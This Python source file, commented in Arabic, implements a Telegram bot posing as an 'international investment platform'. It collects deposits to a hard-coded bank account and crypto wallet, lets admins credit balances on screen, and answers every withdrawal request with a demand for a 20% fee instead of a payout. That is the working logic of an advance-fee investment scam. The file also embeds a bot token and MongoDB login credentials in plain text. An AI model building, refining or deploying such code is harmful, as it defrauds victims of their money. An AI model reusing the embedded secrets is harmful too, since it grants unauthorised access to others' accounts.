import logging
import os
import urllib.parse
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# إعداد السجلات لمراقبة أداء البوت على السيرفر
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور ] =================
TOKEN = '8731999916:AAHdeigVSmil8KD6GeA7OazVZkjVxhq9QJU'
ADMIN_USERNAME = 'HCICICVICIF9'

# قائمة المديرين
ADMINS_LIST = [6016547718]

# --- 🔐 تعديل المونقو (كلمة المرور الجديدة + مصدر المصادقة) ---
u_enc = urllib.parse.quote_plus('Abduh')
p_enc = urllib.parse.quote_plus('Abduh2026')
# تم إضافة authSource=admin لضمان عمل صلاحيات atlasAdmin
MONGO_URI = f"mongodb+srv://{u_enc}:{p_enc}@cluster0.0a4wefx.mongodb.net/DragonFinal?authSource=admin&retryWrites=true&w=majority"

BANK_ACCOUNT = "SA0000000000000000000000"
CRYPTO_WALLET = "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA"

# مبالغ الاستثمار الكاملة (170 سطر يعتمد على هذه القوائم)
PRICES_SAR = ["1000", "1500", "2000", "3000", "5000", "7000", "8000", "10000", "15000", "20000", "30000", "50000"]
PRICES_USD = ["300", "400", "500", "600", "800", "1000", "2000", "3000", "5000", "20000", "30000"]
# ===============================================================

# --- 🗄️ الاتصال بقاعدة بيانات MongoDB ---
try:
    # استخدام مهلة زمنية قصيرة للكشف عن الأخطاء فوراً
    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    db = client['investment_platform']
    users_col = db['users']
    # اختبار الاتصال فعلياً
    client.admin.command('ping')
    logger.info("✅ تم الاتصال بسحابة MongoDB بنجاح")
except Exception as e:
    logger.error(f"❌ فشل الاتصال بالمونغو: {e}")

def get_user_data(uid):
    if users_col is None: return {"uid": uid, "bal_sar": 0.0, "bal_usd": 0.0}
    user = users_col.find_one({"uid": uid})
    if not user:
        user = {"uid": uid, "bal_sar": 0.0, "bal_usd": 0.0}
        users_col.insert_one(user)
    return user

def update_balance(uid, curr, amt):
    if users_col is None: return
    field = "bal_sar" if curr == "sr" else "bal_usd"
    users_col.update_one({"uid": uid}, {"$inc": {field: float(amt)}})

# --- 🏠 واجهة المستخدم ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user_data(user.id)

    keyboard = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]

    text = (f"🏦 **المنصة العالمية للاستثمار**\n\n"
            f"مرحباً بك سيد {user.first_name}\n"
            f"يرجى اختيار القسم المطلوب للبدء:")

    if update.message:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    uid = query.from_user.id
    await query.answer()

    if data == 'main':
        await start(update, context)

    elif data == 'wallet':
        u = get_user_data(uid)
        text = f"📊 **تفاصيل محفظتك:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`"
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'withdraw':
        u = get_user_data(uid)
        if u['bal_sar'] <= 0 and u['bal_usd'] <= 0:
            await query.edit_message_text("❌ محفظتك فارغة حالياً.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data='main')]]))
        else:
            msg = "📤 **إجراءات سحب الأرباح:**\n\n"
            if u['bal_sar'] > 0:
                fee_sar = u['bal_sar'] * 0.20
                msg += f"🇸🇦 رصيدك: `{u['bal_sar']:,}` ريال\n⚠️ يرجى دفع رسوم سحب الأرباح (20%): `{fee_sar:,}` ريال\n"
                msg += "--------------------------\n"
            if u['bal_usd'] > 0:
                fee_usd = u['bal_usd'] * 0.20
                msg += f"🇺🇸 رصيدك: `{u['bal_usd']:,}` دولار\n⚠️ يرجى دفع رسوم سحب الأرباح (20%): `{fee_usd:,}` دولار\n"
            msg += "\n💡 الرسوم لفتح بوابة التحويل الدولي."
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'c_sr' or data == 'c_us':
        curr = 'sr' if data == 'c_sr' else 'us'
        prices = PRICES_SAR if curr == 'sr' else PRICES_USD
        kb = [prices[i:i+2] for i in range(0, len(prices), 2)]
        btns = [[InlineKeyboardButton(f"{p} {'ريال' if curr=='sr' else '$'}", callback_data=f"{curr[0]}_{p}") for p in row] for row in kb]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await query.edit_message_text(f"🏦 اختر مبلغ الاستثمار:", reply_markup=InlineKeyboardMarkup(btns))

    elif data.startswith(('s_', 'u_')):
        c_type = 'sr' if data.startswith('s_') else 'us'
        amt = data.split('_')[1]
        addr = BANK_ACCOUNT if c_type == 'sr' else CRYPTO_WALLET
        await query.edit_message_text(f"✅ تم اختيار {amt}\nحول إلى:\n`{addr}`\n\n📸 أرسل الإيصال هنا.", parse_mode='Markdown')

    # --- 🛠️ معالجة أوامر المديرين ---
    elif data.startswith(('ok_', 'no_')):
        if uid not in ADMINS_LIST:
            await query.answer("❌ عذراً، هذا الزر للمديرين فقط!", show_alert=True)
            return

        if data.startswith('ok_'):
            parts = data.split('_')
            _, c, a, target = parts[0], parts[1], parts[2], parts[3]
            update_balance(int(target), c, float(a))
            await query.edit_message_caption(caption=f"✅ تم تأكيد الإيداع بمبلغ {a} {c}")
            try:
                await context.bot.send_message(chat_id=int(target), text=f"🎉 تم إيداع `{a}` {c} في محفظتك بنجاح!")
            except: pass

        elif data.startswith('no_'):
            t = data.split('_')[1]
            await query.edit_message_caption(caption="❌ تم رفض الإيصال من قبل الإدارة.")
            try:
                await context.bot.send_message(chat_id=int(t), text=" ❌ تم رفض الإيصال من قبل الإدارة.")
            except: pass

async def handle_receipt(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        user = update.effective_user
        await update.message.reply_text("✅ تم استلام الإيصال، جاري المراجعة...")

        def btn(a, c): return InlineKeyboardButton(f"➕ {a} {c}", callback_data=f"ok_{c}_{a}_{user.id}")
        
        kb = [
            [btn("1000", "sr"), btn("1500", "sr")],
            [btn("5000", "sr"), btn("10000", "sr")],
            [btn("300", "us"), btn("1000", "us")],
            [InlineKeyboardButton("❌ رفض الإيصال", callback_data=f"no_{user.id}")]
        ]
        cap = f"🔔 **لوحة المالك**\nالاسم: {user.first_name}\nID: `{user.id}`"

        for admin_id in ADMINS_LIST:
            try:
                await context.bot.send_photo(chat_id=admin_id, photo=update.message.photo[-1].file_id, caption=cap, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
            except Exception as e:
                logger.error(f"فشل الإرسال للمدير {admin_id}: {e}")

if __name__ == '__main__':
    # تشغيل البوت بنظام المعالجة المتوازية للسرعة القصوى
    app = Application.builder().token(TOKEN).concurrent_updates(True).build()

    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_receipt))

    logger.info("🚀 المنصة تعمل بنظام الإدارة والمونغو المحدث...")
    app.run_polling(drop_pending_updates=True, close_loop=True, stop_signals=None)
